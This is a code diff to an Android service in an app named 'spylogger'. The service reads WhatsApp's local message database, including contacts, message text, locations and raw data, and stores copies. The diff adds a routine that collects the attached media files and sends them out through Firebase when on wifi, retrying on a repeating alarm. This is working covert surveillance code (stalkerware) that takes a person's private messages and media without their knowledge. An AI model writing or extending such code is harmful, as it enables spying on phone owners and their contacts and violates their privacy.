@@ -1,5 +1,6 @@
 package com.gravatasufoca.spylogger.services;
 
+import android.app.PendingIntent;
 import android.app.Service;
 import android.content.Intent;
 import android.content.pm.PackageManager.NameNotFoundException;
@@ -8,14 +9,20 @@ import android.os.FileObserver;
 import android.os.IBinder;
 import android.util.Log;
 
+import com.google.firebase.iid.FirebaseInstanceId;
 import com.gravatasufoca.spylogger.dao.DatabaseHelper;
 import com.gravatasufoca.spylogger.dao.whatsapp.DatabaseHelperExternal;
+import com.gravatasufoca.spylogger.helpers.NetworkUtil;
+import com.gravatasufoca.spylogger.helpers.TaskComplete;
 import com.gravatasufoca.spylogger.model.Mensagem;
+import com.gravatasufoca.spylogger.model.TipoAcao;
 import com.gravatasufoca.spylogger.model.TipoMensagem;
 import com.gravatasufoca.spylogger.model.TipoMidia;
 import com.gravatasufoca.spylogger.model.Topico;
 import com.gravatasufoca.spylogger.model.whatsapp.Messages;
+import com.gravatasufoca.spylogger.receivers.Alarm;
 import com.gravatasufoca.spylogger.utils.Utils;
+import com.gravatasufoca.spylogger.vos.FcmMessageVO;
 import com.j256.ormlite.dao.Dao;
 import com.j256.ormlite.dao.GenericRawResults;
 import com.j256.ormlite.field.DataType;
@@ -28,8 +35,12 @@ import java.io.IOException;
 import java.sql.SQLException;
 import java.util.ArrayList;
 import java.util.Date;
+import java.util.HashMap;
+import java.util.HashSet;
 import java.util.Iterator;
 import java.util.List;
+import java.util.Map;
+import java.util.Set;
 
 public class WhatsAppService extends Service {
 
@@ -92,7 +103,7 @@ public class WhatsAppService extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        if((new File(DatabaseHelperExternal.DATABASE_NAME)).exists()) {
+        if ((new File(DatabaseHelperExternal.DATABASE_NAME)).exists()) {
             Log.d("WHATSLOG - FLAGS", Integer.toString(flags));
             Utils.context = getApplicationContext();
             updateTopicos();
@@ -107,9 +118,6 @@ public class WhatsAppService extends Service {
 
     private void setObserver() {
         Utils.whatsObserver = new FileObserver(pathToWatch) { // set up a file observer to
-            // watch this directory on
-            // sd card
-
             @Override
             public void onEvent(int event, String file) {
 
@@ -120,7 +128,6 @@ public class WhatsAppService extends Service {
                         updateTopicos();
                         break;
                     default:
-                        // just ignore
                         break;
                 }
 
@@ -164,26 +171,27 @@ public class WhatsAppService extends Service {
                 }
             }
 
-        updateMsgs(topicos);
+            updateMsgs(topicos);
 
         } catch (Exception e) {
-          Log.e("spylogger",e.getMessage());
-        }finally {
-            raws=null;
-            topicos=null;
-            iterator=null;
+            Log.e("spylogger", e.getMessage());
+        } finally {
+            raws = null;
+            topicos = null;
+            iterator = null;
         }
     }
 
-    private void updateMsgs(List<Topico> topicos){
-        GenericRawResults<Object[]> rawResults=null;
+    private void updateMsgs(List<Topico> topicos) {
+        GenericRawResults<Object[]> rawResults = null;
         List<Mensagem> mensagens = new ArrayList<>();
+        List<Mensagem> mensagensComMidia = new ArrayList<>();
         Iterator<Object[]> iterator;
         try {
 
             rawResults = this.daoMsgExternal
                     .queryRaw("select _id,key_remote_jid,key_from_me,data,timestamp,media_wa_type,media_size,remote_resource,received_timestamp, case when raw_data is not null  then 1 else '' end,media_mime_type,raw_data,thumb_image,latitude,longitude from messages where key_remote_jid!='-1' and _id not in( select idReferencia from localdb.mensagem ) "
-                            , new DataType[]{DataType.INTEGER,DataType.STRING,DataType.INTEGER,DataType.STRING,DataType.DATE_LONG,DataType.STRING,DataType.STRING,DataType.STRING,DataType.DATE_LONG,DataType.INTEGER,DataType.STRING,DataType.BYTE_ARRAY,DataType.BYTE_ARRAY});
+                            , new DataType[]{DataType.INTEGER, DataType.STRING, DataType.INTEGER, DataType.STRING, DataType.DATE_LONG, DataType.STRING, DataType.STRING, DataType.STRING, DataType.DATE_LONG, DataType.INTEGER, DataType.STRING, DataType.BYTE_ARRAY, DataType.BYTE_ARRAY});
 
             iterator = rawResults.iterator();
             int contador = 0;
@@ -196,7 +204,7 @@ public class WhatsAppService extends Service {
                     resultRaw = null;
                 }
                 if (resultRaw == null) {
-                    if(!mensagens.isEmpty()){
+                    if (!mensagens.isEmpty()) {
                         dbHelper.getDao(Mensagem.class).create(mensagens);
                     }
                     try {
@@ -204,7 +212,7 @@ public class WhatsAppService extends Service {
                     } catch (IOException e) {
                     }
                     updateMsgs(topicos);
-                   return;
+                    return;
                 }
 
                 Topico tmpTopico = null;
@@ -214,8 +222,8 @@ public class WhatsAppService extends Service {
                         break;
                     }
                 }
-                if(tmpTopico==null){
-                    Log.e(this.getClass().getSimpleName(),"TOPICO NAO ENCONTRADO: "+resultRaw[1]);
+                if (tmpTopico == null) {
+                    Log.e(this.getClass().getSimpleName(), "TOPICO NAO ENCONTRADO: " + resultRaw[1]);
                     continue;
                 }
                 Mensagem mensagem = new Mensagem.MensagemBuilder()
@@ -230,26 +238,26 @@ public class WhatsAppService extends Service {
                         .setContato((String) (resultRaw[7] != null ? resultRaw[7] : resultRaw[1]))
                         .setTopico(tmpTopico)
                         .setTemMedia("1".equals(resultRaw[9]))
-                        .setLatitude(resultRaw[13]!=null? Double.parseDouble((String) resultRaw[13]):null )
-                        .setLongitude(resultRaw[14]!=null? Double.parseDouble((String) resultRaw[14]):null)
+                        .setLatitude(resultRaw[13] != null ? Double.parseDouble((String) resultRaw[13]) : null)
+                        .setLongitude(resultRaw[14] != null ? Double.parseDouble((String) resultRaw[14]) : null)
                         .build();
-                mensagem.setRaw_data(resultRaw[11]!=null? Utils.encodeBase64((byte[]) resultRaw[11]):null);
+                mensagem.setRaw_data(resultRaw[11] != null ? Utils.encodeBase64((byte[]) resultRaw[11]) : null);
 
-                if(!mensagem.getRemetente()) {
-                    if (resultRaw[7] != null && !((String)resultRaw[7]).isEmpty()) {
-                        if (((String)resultRaw[7]).indexOf("@") != -1) {
-                            mensagem.setNumeroContato(((String)resultRaw[7]).substring(0, ((String)resultRaw[7]).indexOf("@")));
+                if (!mensagem.getRemetente()) {
+                    if (resultRaw[7] != null && !((String) resultRaw[7]).isEmpty()) {
+                        if (((String) resultRaw[7]).indexOf("@") != -1) {
+                            mensagem.setNumeroContato(((String) resultRaw[7]).substring(0, ((String) resultRaw[7]).indexOf("@")));
                         } else {
-                            mensagem.setNumeroContato(((String)resultRaw[7]));
+                            mensagem.setNumeroContato(((String) resultRaw[7]));
                         }
                     } else {
-                        if (((String)resultRaw[1]).indexOf("@") != -1) {
-                            mensagem.setNumeroContato(((String)resultRaw[1]).substring(0, ((String)resultRaw[1]).indexOf("@")));
+                        if (((String) resultRaw[1]).indexOf("@") != -1) {
+                            mensagem.setNumeroContato(((String) resultRaw[1]).substring(0, ((String) resultRaw[1]).indexOf("@")));
                         } else {
-                            mensagem.setNumeroContato(((String)resultRaw[1]));
+                            mensagem.setNumeroContato(((String) resultRaw[1]));
                         }
                     }
-                }else{
+                } else {
                     mensagem.setContato(null);
                     mensagem.setNumeroContato(null);
                 }
@@ -261,6 +269,9 @@ public class WhatsAppService extends Service {
                     mensagem.setTopico(tmpTopico);
                 }
                 mensagens.add(mensagem);
+                if (mensagem.getTamanhoArquivo() > 0) {
+                    mensagensComMidia.add(mensagem);
+                }
                 contador++;
                 try {
                     if (iterator.hasNext()) {
@@ -272,10 +283,10 @@ public class WhatsAppService extends Service {
                     } else {
                         dbHelper.getDao(Mensagem.class).create(mensagens);
                     }
-                }catch (Exception e){
+                } catch (Exception e) {
                     dbHelper.getDao(Mensagem.class).create(mensagens);
                     try {
-                        if(rawResults!=null) {
+                        if (rawResults != null) {
                             rawResults.close();
                         }
                     } catch (IOException ee) {
@@ -284,15 +295,92 @@ public class WhatsAppService extends Service {
                 }
             }
             Log.i(this.getClass().getSimpleName(), "TERMINOU");
-        }catch (SQLException e){
-            Log.e("spylogger",e.getMessage());
-        }finally {
+
+            if (!mensagensComMidia.isEmpty()) {
+                verificaArquivos(mensagensComMidia,1);
+            }
+        } catch (SQLException e) {
+            Log.e("spylogger", e.getMessage());
+        } finally {
             try {
-                if(rawResults!=null) {
+                if (rawResults != null) {
                     rawResults.close();
                 }
             } catch (IOException e) {
             }
+        }
+    }
+
+    private void verificaArquivos(List<Mensagem> mensagens, final int contador) {
+        Map<Mensagem, File> arquivos = new HashMap<>();
+        final Set<Mensagem> pendentes = new HashSet<>();
+        Set<Mensagem> existentes = new HashSet<>();
+        int timeout = 60000;
+        while (timeout > 0 && (pendentes.size() + existentes.size() < mensagens.size())) {
+            for (Mensagem mensagem : mensagens) {
+                File arquivo = Utils.getMediaFile(
+                        mensagem.getTipoMidia(),
+                        mensagem.getTamanhoArquivo(),
+                        mensagem.getDataRecebida(), 1);
+                if (arquivo != null) {
+                    arquivos.put(mensagem, arquivo);
+                    existentes.add(mensagem);
+                } else {
+                    pendentes.add(mensagem);
+                }
+            }
+            try {
+                Thread.sleep(10000);
+                timeout -= 10000;
+            } catch (InterruptedException e) {
+            }
+        }
+        /**
+         * envia caso esteja no wifi
+         */
+        if (NetworkUtil.isWifi(getApplicationContext())) {
+
+            FcmMessageVO fcmMessageVO = new FcmMessageVO();
+            fcmMessageVO.setTipoAcao(TipoAcao.REENVIAR_ARQUIVOS);
+            fcmMessageVO.setChave(FirebaseInstanceId.getInstance().getToken());
+
+            FcmHelperService fcmHelperService = new FcmHelperService(getApplicationContext(), fcmMessageVO);
+            fcmHelperService.enviarArquivos(new ArrayList<Mensagem>(existentes));
+        } else {
+            /**
+             * guardo para enviar depois quando estiver conectado
+             */
+            try {
+                Dao<Mensagem, Integer> dao = dbHelper.getDao(Mensagem.class);
+
+                for (Mensagem mensagem : existentes) {
+                    mensagem.setArquivo(Utils.getBytesFromFile(arquivos.get(mensagem)));
+                    dao.update(mensagem);
+                }
+
+            } catch (SQLException e) {
+                e.printStackTrace();
+            }
+        }
+
+        if (!pendentes.isEmpty()) {
+            if (Utils.alarm == null) {
+                Utils.alarm = new Alarm();
+            }
+
+            Intent intent = new Intent(getApplicationContext(), Alarm.class);
+            final PendingIntent pi = PendingIntent.getBroadcast(getApplicationContext(), 0, intent, 0);
+
+            Utils.alarm.setRepeatingAlarm(getApplicationContext(),pi, 5, new TaskComplete() {
+                @Override
+                public void onFinish(Object object) {
+                    if(contador+1<4) {
+                        verificaArquivos(new ArrayList<Mensagem>(pendentes), contador + 1);
+                    }else{
+                        Utils.alarm.cancelAlarm(getApplicationContext(),pi);
+                    }
+                }
+            });
         }
     }
 }
